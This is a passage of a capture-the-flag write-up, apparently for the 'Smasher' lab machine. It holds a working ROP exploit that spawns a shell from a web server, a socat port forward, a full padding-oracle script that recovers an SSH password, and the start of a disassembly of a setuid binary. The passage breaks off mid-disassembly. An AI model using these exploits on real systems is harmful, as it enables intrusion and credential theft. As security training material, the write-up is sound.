        <span class="bp">self</span><span class="o">.</span><span class="n">binsh_str_offset</span> <span class="o">=</span> <span class="mh">0x18cd57</span>

        <span class="c1"># file descriptors</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">4</span>      <span class="c1"># file descriptor of our connection</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stdin</span> <span class="o">=</span> <span class="mi">0</span>   <span class="c1">#</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1">#</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stderr</span> <span class="o">=</span> <span class="mi">3</span>  <span class="c1">#</span>

        <span class="c1"># manually found</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s">&#39;vaaaaaac&#39;</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">__leak</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fun_got</span><span class="p">):</span>
        <span class="p">[</span><span class="o">...</span><span class="p">]</span>

    <span class="k">def</span> <span class="nf">__exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">):</span>
        <span class="n">nop_sled</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span>

        <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">nop_sled</span>

        <span class="n">dup2_libc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dup2_offset</span> <span class="o">+</span> <span class="n">libc_base</span>

        <span class="c1"># dup stdin</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rsi_pop_r15</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">stdin</span><span class="p">))</span>      <span class="c1"># fd we want to dup from</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xb5</span><span class="p">))</span>            <span class="c1"># bs filler</span>

        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rdi</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">fd</span><span class="p">))</span>         <span class="c1"># fd we want to dup to</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">dup2_libc</span><span class="p">))</span>       <span class="c1"># function we want to call</span>

        <span class="c1"># dup stdout as well</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rsi_pop_r15</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="p">))</span>     <span class="c1"># fd we want to dup from</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xb5</span><span class="p">))</span>            <span class="c1"># bs filler</span>

        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rdi</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">fd</span><span class="p">))</span>         <span class="c1"># fd we want to dup to</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">dup2_libc</span><span class="p">))</span>       <span class="c1"># function we want to call</span>

        <span class="c1"># we can not also dup the stderr to our fd, so we will have to de without</span>

        <span class="n">binsh_str</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">binsh_str_offset</span> <span class="o">+</span> <span class="n">libc_base</span>
        <span class="n">system_libc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">system_offset</span> <span class="o">+</span> <span class="n">libc_base</span>

        <span class="c1"># call system with argument &#39;/bin/sh&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rdi</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh_str</span><span class="p">))</span>       <span class="c1"># fd we want to dup to</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_libc</span><span class="p">))</span>     <span class="c1"># function we want to call</span>

        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;warn&#39;</span>

        <span class="n">retry</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">while</span> <span class="n">retry</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">)</span>

            <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">file_not_found</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">timeout</span><span class="p">)</span>

            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">file_not_found</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
                <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;info&#39;</span>
                <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">&#39;Got shell!&#39;</span><span class="p">)</span>
                <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;warn&#39;</span>
                <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
                <span class="n">retry</span> <span class="o">=</span> <span class="bp">False</span>

            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;Start leaking address.&#39;</span><span class="p">)</span>
        <span class="n">write_libc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__leak</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">write_got</span><span class="p">)</span>
        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_libc</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">write_offset</span>

        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">&#39;Found libc base: {0}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;Starting exploit.&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__exploit</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>


<span class="n">Exploit</span><span class="p">(</span><span class="s">&#39;10.10.10.89&#39;</span><span class="p">,</span> <span class="mi">1111</span><span class="p">)</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</pre></div></p>
<h2 id="user">User<a class="headerlink" href="#user" title="Permanent link"></a></h2>
<p>Now that we have shell on the machine, let&rsquo;s look at the processes that are running.</p>
<div class="codehilite"><pre><span class="nv">$ </span>ps -aux
<span class="o">[</span>...<span class="o">]</span>
smasher    <span class="m">652</span>  0.0  0.1  <span class="m">24364</span>  <span class="m">1708</span> ?        S    13:37   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind<span class="o">=</span>127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py
<span class="o">[</span>...<span class="o">]</span>
www       <span class="m">1227</span>  0.0  0.0   <span class="m">4364</span>   <span class="m">660</span> ?        S    14:09   0:00 ./tiny public_html/ 1111
<span class="o">[</span>...<span class="o">]</span>
</pre></div>

<p>To make things a little easier, we use socat to listen on an outside port.
<div class="codehilite"><pre><span class="nv">$ </span>socat TCP-LISTEN:9001,fork,reuseaddr TCP:127.0.0.1:1337
</pre></div></p>
<p>From our own machine:
<div class="codehilite"><pre><span class="nv">$ </span>nc 10.10.10.89 9001
<span class="o">[</span>*<span class="o">]</span> Welcome to AES Checker! <span class="o">(</span><span class="nb">type</span> <span class="s1">&#39;exit&#39;</span> to quit<span class="o">)</span>
<span class="o">[</span>!<span class="o">]</span> Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg<span class="o">==</span>
Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg<span class="o">==</span>
Hash is OK!
Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdw<span class="o">==</span>
Invalid Padding!
</pre></div></p>
<p>This looks like a good moment to implement a padding oracle attack. We used the following resource and implement a quick tailor made attack<sup>6</sup>.</p>
<div class="codehilite"><pre><span class="ch">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">connect</span><span class="p">,</span> <span class="n">log</span>


<span class="c1"># utils</span>
<span class="k">def</span> <span class="nf">bytes2hexstring</span><span class="p">(</span><span class="n">bts</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">&quot;:&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;{:02x}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">bts</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">bytesjoin</span><span class="p">(</span><span class="n">bts</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">bts</span><span class="p">])</span>


<span class="k">def</span> <span class="nf">bytexor</span><span class="p">(</span><span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">bytesjoin</span><span class="p">([</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">)])</span>


<span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remove_padding</span><span class="p">(</span><span class="n">bts</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">bts</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">bts</span><span class="p">[</span><span class="o">-</span><span class="n">padding</span><span class="p">:]</span> <span class="o">==</span> <span class="n">bts</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="n">padding</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">bts</span><span class="p">[:</span><span class="o">-</span><span class="n">padding</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">bts</span>


<span class="k">def</span> <span class="nf">intxor</span><span class="p">(</span><span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">)]</span>


<span class="k">class</span> <span class="nc">SmashingOracle</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">invalid_output</span> <span class="o">=</span> <span class="s">&quot;Invalid Padding!&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">valid_output</span> <span class="o">=</span> <span class="s">&quot;Hash is OK!&quot;</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s">&#39;Insert ciphertext: &#39;</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span> <span class="o">=</span> <span class="mi">16</span>  <span class="c1"># AES128</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">first_block</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span>

        <span class="c1"># init</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proc</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">__is_valid</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">block</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="n">output</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">valid_output</span> <span class="ow">in</span> <span class="n">output</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">invalid_output</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span>

    <span class="k">def</span> <span class="nf">__smash_oracle</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">C1</span><span class="p">,</span> <span class="n">C2</span><span class="p">):</span>
        <span class="n">I2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span>
        <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">17</span><span class="p">):</span>
            <span class="n">junk</span> <span class="o">=</span> <span class="n">intxor</span><span class="p">(</span><span class="n">I2</span><span class="p">,</span> <span class="n">padding</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

            <span class="k">for</span> <span class="n">itr</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
                <span class="n">junk</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">block_size</span> <span class="o">-</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">itr</span>

                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">__is_valid</span><span class="p">(</span><span class="n">bytesjoin</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span> <span class="o">+</span> <span class="n">C2</span><span class="p">):</span>
                    <span class="n">I2</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">block_size</span> <span class="o">-</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">itr</span> <span class="o">^</span> <span class="n">idx</span>

                    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;Found: </span><span class="si">%3d</span><span class="s"> - </span><span class="si">%s</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">itr</span><span class="p">,</span> <span class="n">bytes2hexstring</span><span class="p">(</span><span class="n">bytesjoin</span><span class="p">(</span><span class="n">I2</span><span class="p">)))</span>
                    <span class="k">break</span>

        <span class="k">return</span> <span class="n">bytexor</span><span class="p">(</span><span class="n">C1</span><span class="p">,</span> <span class="n">bytesjoin</span><span class="p">(</span><span class="n">I2</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
        <span class="n">C</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
        <span class="n">n_blocks</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">C</span><span class="p">)</span>
        <span class="n">C</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">first_block</span> <span class="o">+</span> <span class="n">C</span>

        <span class="n">result</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
        <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">n_blocks</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span><span class="p">):</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__smash_oracle</span><span class="p">(</span>
                <span class="n">C</span><span class="p">[</span><span class="n">block</span><span class="p">:</span><span class="n">block</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span><span class="p">],</span>
                <span class="n">C</span><span class="p">[</span><span class="n">block</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span><span class="p">:</span><span class="n">block</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">block_size</span><span class="p">]</span>
            <span class="p">)</span>

        <span class="n">result</span> <span class="o">=</span> <span class="n">remove_padding</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">&#39;Result: </span><span class="si">%s</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">result</span>


<span class="n">secret</span> <span class="o">=</span> <span class="s">&#39;irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==&#39;</span>
<span class="n">SmashingOracle</span><span class="p">(</span><span class="s">&#39;10.10.10.89&#39;</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
</pre></div>

<p>This way, we obtain the plaintext pretty fast:
<div class="codehilite"><pre>SSH password for user &#39;smasher&#39; is: xxxxxxxxxxxxxxxxxxxxxx
</pre></div></p>
<p>Now that we have the SSH password, let&rsquo;s grab user.
<div class="codehilite"><pre><span class="nv">$ </span>sshpass -p xxxxxxxxxxxxxxxxxxxxxx ssh smasher@10.10.10.89
smasher@smasher:~<span class="nv">$ </span>cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</pre></div></p>
<h2 id="root">Root<a class="headerlink" href="#root" title="Permanent link"></a></h2>
<p>From here, things get boring. After looking around for a very long time, we find the following binary:
<div class="codehilite"><pre>smasher@smasher:~<span class="nv">$ </span>ls -lah /usr/bin/checker
-rwsr-xr-x <span class="m">1</span> root root 14K Apr  <span class="m">4</span>  <span class="m">2018</span> /usr/bin/checker
smasher@smasher:~<span class="nv">$ </span>checker
<span class="o">[</span>+<span class="o">]</span> Welcome to file UID checker 0.1 by dzonerzy

Missing arguments
smasher@smasher:~<span class="nv">$ </span>checker user.txt
<span class="o">[</span>+<span class="o">]</span> Welcome to file UID checker 0.1 by dzonerzy

File UID: 0

Data:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
smasher@smasher:~<span class="nv">$ </span>checker /root/root.txt
<span class="o">[</span>+<span class="o">]</span> Welcome to file UID checker 0.1 by dzonerzy

Acess failed , you don<span class="err">&#39;</span>t have permission!
smasher@smasher:~<span class="nv">$ </span>checker /etc/passwd
<span class="o">[</span>+<span class="o">]</span> Welcome to file UID checker 0.1 by dzonerzy

Segmentation fault
</pre></div></p>
<p>This looks interesting. We download the binary and disassemble main.
<div class="codehilite"><pre><span class="nv">$ </span>strings -n <span class="m">20</span> checker
/lib64/ld-linux-x86-64.so.2
You<span class="s1">&#39;re not &#39;</span>smasher<span class="s1">&#39; user please level up bro!</span>
<span class="s1">[+] Welcome to file UID checker 0.1 by dzonerzy</span>
<span class="s1">Acess failed , you don&#39;</span>t have permission!
File does not exist!
GCC: <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.9<span class="o">)</span> 5.4.0 20160609
<span class="o">[</span>...<span class="o">]</span>
gdb&gt; disassemble main
Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
   0x0000000000400a7b &lt;+0&gt;: push   rbp
   0x0000000000400a7c &lt;+1&gt;: mov    rbp,rsp
   0x0000000000400a7f &lt;+4&gt;: sub    rsp,0x230
   0x0000000000400a86 &lt;+11&gt;:    mov    DWORD PTR <span class="o">[</span>rbp-0x224<span class="o">]</span>,edi
   0x0000000000400a8c &lt;+17&gt;:    mov    QWORD PTR <span class="o">[</span>rbp-0x230<span class="o">]</span>,rsi
   0x0000000000400a93 &lt;+24&gt;:    call   0x4007d0 &lt;getuid@plt&gt;
   0x0000000000400a98 &lt;+29&gt;:    cmp    eax,0x0
   0x0000000000400a9d &lt;+34&gt;:    je     0x400ab3 &lt;main+56&gt;
   0x0000000000400a9f &lt;+36&gt;:    mov    edi,0x400c70
   0x0000000000400aa4 &lt;+41&gt;:    call   0x4007a0 &lt;puts@plt&gt;
   0x0000000000400aa9 &lt;+46&gt;:    mov    eax,0xffffffff
   0x0000000000400aae &lt;+51&gt;:    jmp    0x400bb5 &lt;main+314&gt;
   0x0000000000400ab3 &lt;+56&gt;:    mov    edi,0x400ca0
   0x0000000000400ab8 &lt;+61&gt;:    call   0x4007a0 &lt;puts@plt&gt;
   0x0000000000400abd &lt;+66&gt;:    cmp    DWORD PTR <span class="o">[</span>rbp-0x224<span class="o">]</span>,0x1
   0x0000000000400ac4 &lt;+73&gt;:    jle    0x400ba6 &lt;main+299&gt;
   0x0000000000400aca &lt;+79&gt;:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x230<span class="o">]</span>
   0x0000000000400ad1 &lt;+86&gt;:    mov    rax,QWORD PTR <span class="o">[</span>rax+0x8<span class="o">]</span>
   0x0000000000400ad5 &lt;+90&gt;:    mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
   0x0000000000400ad9 &lt;+94&gt;:    mov    edi,0x90
   0x0000000000400ade &lt;+99&gt;:    call   0x400830 &lt;malloc@plt&gt;
   0x0000000000400ae3 &lt;+104&gt;:   mov    QWORD PTR <span class="o">[</span>rbp-0x10<span class="o">]</span>,rax
   0x0000000000400ae7 &lt;+108&gt;:   mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x10<span class="o">]</span>
   0x0000000000400aeb &lt;+112&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
   0x0000000000400aef &lt;+116&gt;:   mov    rsi,rdx
   0x0000000000400af2 &lt;+119&gt;:   mov    rdi,rax
   0x0000000000400af5 &lt;+122&gt;:   call   0x400c40 &lt;stat&gt;
   0x0000000000400afa &lt;+127&gt;:   <span class="nb">test   </span>eax,eax
   0x0000000000400afc &lt;+129&gt;:   jne    0x400b9a &lt;main+287&gt;
   0x0000000000400b02 &lt;+135&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
   0x0000000000400b06 &lt;+139&gt;:   mov    esi,0x4
   0x0000000000400b0b &lt;+144&gt;:   mov    rdi,rax
   0x0000000000400b0e &lt;+147&gt;:   call   0x400860 &lt;access@plt&gt;
   0x0000000000400b13 &lt;+152&gt;:   <span class="nb">test   </span>eax,eax
   0x0000000000400b15 &lt;+154&gt;:   jne    0x400b8e &lt;main+275&gt;
   0x0000000000400b17 &lt;+156&gt;:   mov    edi,0x0
   0x0000000000400b1c &lt;+161&gt;:   call   0x400880 &lt;setuid@plt&gt;
   0x0000000000400b21 &lt;+166&gt;:   mov    edi,0x0
   0x0000000000400b26 &lt;+171&gt;:   call   0x400850 &lt;setgid@plt&gt;
   0x0000000000400b2b &lt;+176&gt;:   mov    edi,0x1
   0x0000000000400b30 &lt;+181&gt;:   call   0x400890 &lt;sleep@plt&gt;
   0x0000000000400b35 &lt;+186&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
   0x0000000000400b39 &lt;+190&gt;:   mov    rdi,rax
   0x0000000000400b3c &lt;+193&gt;:   call   0x4009a6 &lt;ReadFile&gt;
   0x0000000000400b41 &lt;+198&gt;:   mov    QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>,rax
   0x0000000000400b45 &lt;+202&gt;:   mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>
   0x0000000000400b49 &lt;+206&gt;:   lea    rax,<span class="o">[</span>rbp-0x220<span class="o">]</span>
   0x0000000000400b50 &lt;+213&gt;:   mov    rsi,rdx
   0x0000000000400b53 &lt;+216&gt;:   mov    rdi,rax
   0x0000000000400b56 &lt;+219&gt;:   call   0x400790 &lt;strcpy@plt&gt;
   0x0000000000400b5b &lt;+224&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rbp-0x10<span class="o">]</span>
   0x0000000000400b5f &lt;+228&gt;:   mov    eax,DWORD PTR <span class="o">[</span>rax+0x1c<span class="o">]</span>
   0x0000000000400b62 &lt;+231&gt;:   mov    esi,eax
   0x0000000000400b64 &lt;+233&gt;:   mov    edi,0x400cd1
   0x0000000000400b69 &lt;+238&gt;:   mov    eax,0x0
   0x0000000000400b6e &lt;+243&gt;:   call   0x4007e0 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000000000400b73 &lt;+248&gt;:   lea    rax,<span class="o">[</span>rbp-0x220<span class="o">]</span>
   0x0000000000400b7a &lt;+255&gt;:   mov    rsi,rax
   0x0000000000400b7d &lt;+258&gt;:   mov    edi,0x400cdf
   0x0000000000400b82 &lt;+263&gt;:   mov    eax,0x0
   0x0000000000400b87 &lt;+268&gt;:   call   0x4007e0 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000000000400b8c &lt;+273&gt;:   jmp    0x400bb0 &lt;main+309&gt;
   0x0000000000400b8e &lt;+275&gt;:   mov    edi,0x400cf0
